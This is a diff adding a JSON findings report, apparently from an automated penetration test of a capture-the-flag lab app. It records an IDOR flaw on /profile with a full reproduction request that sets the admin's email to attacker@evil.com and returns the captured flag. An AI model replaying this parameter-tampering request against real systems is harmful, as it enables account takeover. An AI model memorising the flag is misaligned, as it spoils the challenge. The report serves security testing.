@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T06:11:43.981964+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3fb59113-9d56-4041-9ee8-82b7b8e6b653",
+      "timestamp": "2026-04-13T06:11:43.981860+00:00",
+      "title": "IDOR - Insecure Direct Object Reference on /profile Email Update",
+      "severity": "critical",
+      "target": "http://172.17.0.1:44339/profile",
+      "description": "The POST /profile endpoint accepts a hidden `username` parameter that is not validated against the authenticated user's session. An attacker authenticated as any user (e.g. 'test') can change the `username` field to 'admin' and update the admin's email address, gaining the flag.",
+      "evidence": "POST /profile with body: email=attacker@evil.com&username=admin\nResponse: 'Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}'\n\nFULL RESPONSE BODY:\n<p>Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}</p>",
+      "tool_used": "curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /profile HTTP/1.1\nHost: 172.17.0.1:44339\nContent-Type: application/x-www-form-urlencoded\nCookie: session=<valid-session>\n\nemail=attacker@evil.com&username=admin",
+        "expected": "Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "53862e24-5d4f-47a1-9e01-dd20abedf2ed",
+      "timestamp": "2026-04-13T06:11:50.399214+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login POST - username/password\"]\n  Browser --> Profile[\"/profile POST - email/username (IDOR)\"]\n  Login --> Session[\"Flask Session Cookie\"]\n  Session --> Profile\n  Profile --> DB[\"SQLite/User DB\"]\n  DB --> Flag[\"flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}\"]"
+    }
+  ]
+}
